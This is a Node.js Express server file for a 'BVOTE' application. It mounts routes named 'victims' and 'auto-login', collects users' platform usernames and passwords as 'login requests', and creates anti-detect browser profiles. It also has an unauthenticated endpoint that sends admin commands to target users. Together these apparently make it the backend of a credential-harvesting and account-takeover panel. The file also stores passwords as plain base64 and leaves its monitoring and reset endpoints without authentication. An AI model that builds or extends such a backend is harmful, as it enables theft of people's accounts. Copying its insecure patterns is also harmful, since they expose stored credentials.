import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import cors from "cors";
import helmet from "helmet";
import dotenv from "dotenv";
import jwt from "jsonwebtoken";
import bcrypt from "bcrypt";
import crypto from "crypto";
import productionDB from "./database.js";
import {
  errorHandler,
  notFoundHandler,
  asyncHandler,
  healthCheck,
  APIError,
  logger,
} from "./middleware/errorHandler.js";
import { redirectMiddleware } from "./middleware/redirectHandler.js";
import {
  requestMonitoring,
  monitoringHealthCheck,
  getPerformanceMetrics,
  getSystemAlerts,
  acknowledgeAlert,
  exportMetrics,
  resetMetrics,
} from "./middleware/monitoring.js";

// Sync System Integration
import SyncIntegration from "./sync-integration.js";
import RealtimeSyncService from "./services/realtime-sync.js";

// Load environment variables
dotenv.config({ path: ".env.production" });

// Import API routes
import autoLoginRoutes from "./routes/autoLogin.js";
import victimsRoutes from "./routes/victims.js";
import accessHistoryRoutes from "./routes/accessHistory.js";
import systemRoutes from "./routes/system.js";
import userFeedbackRoutes from "./routes/userFeedback.js";
import userRoutes from "./routes/user.js";
import publicRoutes from "./routes/public.js";

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: process.env.CORS_ORIGIN?.split(",") || [
      "http://localhost:3000",
      "http://localhost:3001",
      "http://localhost:3002",
    ],
    methods: ["GET", "POST", "PUT", "DELETE"],
    credentials: true,
  },
});

const PORT = process.env.PORT || 3000;

// Security middleware - Disabled HSTS for development
app.use(
  helmet({
    hsts: false, // Disable HTTPS Strict Transport Security for development
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "wss:", "ws:"],
      },
    },
  })
);

// CORS configuration
app.use(
  cors({
    origin: process.env.CORS_ORIGIN?.split(",") || [
      "http://localhost:3000",
      "http://localhost:3001",
      "http://localhost:3002",
    ],
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  })
);

// Apply redirect middleware before body parsing
redirectMiddleware.forEach((middleware) => app.use(middleware));

// Apply request monitoring
app.use(requestMonitoring());

app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// JWT middleware
const authenticateToken = async (req, res, next) => {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];

  if (!token) {
    return res.status(401).json({ error: "Access token required" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const user = await productionDB.getUserByEmail(decoded.email);

    if (!user || !user.is_active) {
      return res.status(403).json({ error: "User not found or inactive" });
    }

    req.user = user;
    next();
  } catch (error) {
    return res.status(403).json({ error: "Invalid or expired token" });
  }
};

// Enhanced health check endpoint
app.get("/api/health", healthCheck);

// Monitoring endpoints
app.get("/api/monitoring/health", monitoringHealthCheck);

app.get("/api/monitoring/metrics", (req, res) => {
  const metrics = getPerformanceMetrics();
  res.json({ success: true, data: metrics });
});

app.get("/api/monitoring/alerts", (req, res) => {
  const limit = parseInt(req.query.limit) || 50;
  const alerts = getSystemAlerts(limit);
  res.json({ success: true, data: alerts });
});

app.post("/api/monitoring/alerts/:alertId/acknowledge", (req, res) => {
  const { alertId } = req.params;
  const acknowledged = acknowledgeAlert(alertId);

  if (acknowledged) {
    res.json({ success: true, message: "Alert acknowledged" });
  } else {
    res.status(404).json({ success: false, error: "Alert not found" });
  }
});

app.post("/api/monitoring/export", (req, res) => {
  const result = exportMetrics();
  if (result.success) {
    res.json({ success: true, data: result });
  } else {
    res.status(500).json({ success: false, error: result.error });
  }
});

app.post("/api/monitoring/reset", (req, res) => {
  resetMetrics();
  res.json({ success: true, message: "Metrics reset successfully" });
});

// Authentication endpoints
app.post(
  "/api/auth/login",
  asyncHandler(async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
      throw new APIError(
        "Email and password required",
        400,
        "MISSING_CREDENTIALS"
      );
    }

    const user = await productionDB.getUserByEmail(email);
    if (!user) {
      throw new APIError("Invalid credentials", 401, "INVALID_CREDENTIALS");
    }

    const isValidPassword = await bcrypt.compare(password, user.password_hash);
    if (!isValidPassword) {
      throw new APIError("Invalid credentials", 401, "INVALID_CREDENTIALS");
    }

    if (!user.is_active) {
      throw new APIError("Account is inactive", 403, "ACCOUNT_INACTIVE");
    }

    // Generate tokens
    const accessToken = jwt.sign(
      { id: user.id, email: user.email, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: process.env.JWT_EXPIRES_IN || "1h" }
    );

    const refreshToken = jwt.sign(
      { id: user.id, email: user.email },
      process.env.JWT_REFRESH_SECRET || process.env.JWT_SECRET,
      { expiresIn: process.env.JWT_REFRESH_EXPIRES_IN || "7d" }
    );

    // Update last login
    await productionDB.query(
      "UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = $1",
      [user.id]
    );

    // Log login event
    await productionDB.logEvent(
      "info",
      "User login successful",
      {
        userId: user.id,
        email: user.email,
      },
      user.id,
      req.ip
    );

    logger.info("User logged in successfully", {
      userId: user.id,
      email: user.email,
    });

    res.json({
      success: true,
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
        full_name: user.full_name,
        avatar_url: user.avatar_url,
      },
      tokens: {
        access_token: accessToken,
        refresh_token: refreshToken,
      },
    });
  })
);

// Token refresh endpoint
app.post("/api/auth/refresh", async (req, res) => {
  try {
    const { refresh_token } = req.body;

    if (!refresh_token) {
      return res.status(401).json({ error: "Refresh token required" });
    }

    const decoded = jwt.verify(refresh_token, process.env.JWT_REFRESH_SECRET);
    const user = await productionDB.getUserByEmail(decoded.email);

    if (!user || !user.is_active) {
      return res.status(403).json({ error: "User not found or inactive" });
    }

    const newAccessToken = jwt.sign(
      { id: user.id, email: user.email, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: process.env.JWT_EXPIRES_IN }
    );

    res.json({
      success: true,
      access_token: newAccessToken,
    });
  } catch (error) {
    res.status(403).json({ error: "Invalid refresh token" });
  }
});

// Dashboard data endpoint
app.get("/api/dashboard/stats", authenticateToken, async (req, res) => {
  try {
    const stats = await productionDB.query(`
      SELECT
        (SELECT COUNT(*) FROM login_requests WHERE status = 'pending') as pending_requests,
        (SELECT COUNT(*) FROM login_requests WHERE status = 'completed') as completed_requests,
        (SELECT COUNT(*) FROM login_requests WHERE status = 'failed') as failed_requests,
        (SELECT COUNT(*) FROM users WHERE is_active = true) as active_users,
        (SELECT COUNT(*) FROM chrome_profiles WHERE is_active = true) as active_profiles
    `);

    res.json({
      success: true,
      data: stats.rows[0],
    });
  } catch (error) {
    console.error("Dashboard stats error:", error);
    res.status(500).json({ error: "Failed to fetch dashboard stats" });
  }
});

// Login requests endpoint
app.get("/api/login-requests", authenticateToken, async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const offset = (page - 1) * limit;

    const filters = {};
    if (req.query.status) filters.status = req.query.status;
    if (req.query.platform) filters.platform = req.query.platform;

    const requests = await productionDB.getLoginRequests(
      limit,
      offset,
      filters
    );

    // Get total count
    const countResult = await productionDB.query(
      "SELECT COUNT(*) as total FROM login_requests"
    );
    const total = parseInt(countResult.rows[0].total);

    res.json({
      success: true,
      data: requests,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit),
      },
    });
  } catch (error) {
    console.error("Login requests error:", error);
    res.status(500).json({ error: "Failed to fetch login requests" });
  }
});

// Create login request endpoint
app.post("/api/login-requests", authenticateToken, async (req, res) => {
  try {
    const { platform, username, password } = req.body;

    if (!platform || !username || !password) {
      return res
        .status(400)
        .json({ error: "Platform, username, and password required" });
    }

    // Encrypt password (simple base64 for demo - use proper encryption in production)
    const passwordEncrypted = Buffer.from(password).toString("base64");

    const requestData = {
      user_id: req.user.id,
      platform,
      username,
      password_encrypted: passwordEncrypted,
      ip_address: req.ip,
      user_agent: req.headers["user-agent"],
      browser_info: {
        userAgent: req.headers["user-agent"],
        acceptLanguage: req.headers["accept-language"],
      },
      expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000), // 24 hours
    };

    const loginRequest = await productionDB.createLoginRequest(requestData);

    // Log event
    await productionDB.logEvent(
      "info",
      "Login request created",
      {
        requestId: loginRequest.id,
        platform,
        username,
      },
      req.user.id,
      req.ip
    );

    res.json({
      success: true,
      data: loginRequest,
    });
  } catch (error) {
    console.error("Create login request error:", error);
    res.status(500).json({ error: "Failed to create login request" });
  }
});

// MoreLogin integration endpoints
app.post(
  "/api/morelogin/create-profile",
  authenticateToken,
  async (req, res) => {
    try {
      // Mock MoreLogin profile creation for now
      const profileData = {
        id: crypto.randomUUID(),
        name: req.body.name || "New Profile",
        status: "created",
        created_at: new Date().toISOString(),
      };

      await productionDB.logEvent(
        "info",
        "MoreLogin profile created",
        {
          profileId: profileData.id,
          profileName: profileData.name,
        },
        req.user.id,
        req.ip
      );

      res.json({
        success: true,
        data: profileData,
      });
    } catch (error) {
      console.error("MoreLogin profile creation error:", error);
      res.status(500).json({ error: "Failed to create MoreLogin profile" });
    }
  }
);

// Socket.IO connection handling
io.on("connection", (socket) => {
  console.log("Client connected:", socket.id);

  socket.on("join-room", (room) => {
    socket.join(room);
    console.log(`Socket ${socket.id} joined room: ${room}`);
  });

  socket.on("login-status-update", (data) => {
    socket.to("admin-room").emit("login-status-changed", data);
  });

  socket.on("disconnect", () => {
    console.log("Client disconnected:", socket.id);
  });
});

// Note: Do NOT register notFound/error handlers here; they must be added AFTER routes are mounted

// Initialize database and start server
async function startServer() {
  try {
    console.log("🚀 Starting BVOTE Production Server...");

    // Initialize database
    const dbConnected = await productionDB.initialize();
    if (!dbConnected) {
      console.error("❌ Failed to connect to database");
      process.exit(1);
    }

  // Mount API routes
    app.use("/api/auto-login", autoLoginRoutes);
    app.use("/api/victims", victimsRoutes);
    app.use("/api/access-history", accessHistoryRoutes);
    app.use("/api/system", systemRoutes);
    app.use("/api/user-feedback", userFeedbackRoutes);
    app.use("/api/user", userRoutes);
    app.use("/api/public", publicRoutes);

    console.log("✅ API routes mounted successfully");

    // Sync System Routes - API endpoints for sync functionality
    app.get("/api/sync/status", (req, res) => {
      const stats = {
        status: "active",
        timestamp: new Date().toISOString(),
        connections: {
          admin: global.adminConnections || 0,
          user: global.userConnections || 0,
          total: (global.adminConnections || 0) + (global.userConnections || 0),
        },
        uptime: process.uptime(),
        sync: global.syncIntegration ? "enabled" : "disabled",
      };

      res.json(stats);
    });

    app.get("/api/sync/health", (req, res) => {
      res.json({
        sync_system: global.syncIntegration ? "healthy" : "inactive",
        websocket: "available",
        database: "connected",
        timestamp: new Date().toISOString(),
      });
    });

    app.post("/api/sync/admin-command", (req, res) => {
      const { command, targetUser, payload } = req.body;

      if (global.syncIntegration && global.syncIntegration.sendCommandToUser) {
        const result = global.syncIntegration.sendCommandToUser(
          targetUser,
          command,
          payload
        );
        res.json({ success: true, commandId: result });
      } else {
        res.status(503).json({ error: "Sync system not available" });
      }
    });

    app.get("/api/sync/stats", (req, res) => {
      if (global.syncIntegration) {
        res.json(global.syncIntegration.getIntegrationStatus());
      } else {
        res.json({ status: "inactive" });
      }
    });

    // Register catch-all 404 and error handlers AFTER all routes/middleware
    app.use(notFoundHandler);
    app.use(errorHandler);

    // Start server
    server.listen(PORT, "0.0.0.0", () => {
      console.log(`✅ Production server running on port ${PORT}`);
      console.log(`🌐 Environment: ${process.env.NODE_ENV}`);
      console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
    });
  } catch (error) {
    console.error("❌ Server startup failed:", error);
    process.exit(1);
  }
}

// Graceful shutdown
process.on("SIGTERM", async () => {
  console.log("🛑 SIGTERM received, shutting down gracefully...");
  await productionDB.close();
  server.close(() => {
    console.log("✅ Server closed");
    process.exit(0);
  });
});

process.on("SIGINT", async () => {
  console.log("🛑 SIGINT received, shutting down gracefully...");
  await productionDB.close();
  server.close(() => {
    console.log("✅ Server closed");
    process.exit(0);
  });
});

// Start the server
startServer();
